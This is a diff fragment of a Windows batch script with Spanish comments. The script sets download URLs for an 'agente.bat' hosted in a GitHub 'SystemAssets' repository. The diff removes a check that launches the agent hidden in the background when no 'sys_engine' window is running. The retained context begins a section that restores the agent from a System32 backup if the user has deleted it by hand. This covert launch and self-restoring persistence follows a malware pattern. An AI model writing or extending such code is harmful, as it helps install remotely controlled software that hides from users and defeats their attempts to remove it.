@@ -17,10 +17,7 @@ set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/
 set "URL_VERSION=%URL_BASE%/version.txt"
 set "URL_AGENTE=%URL_BASE%/agente.bat"
 
-tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
-if %errorlevel% neq 0 (
-    start /b "" cmd /c "%AGENTE_FILE%"
-)
+
 --- 4. RESTAURACIÓN Y EJECUCIÓN ---
 ::Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
 if not exist "%AGENTE_FILE%" (
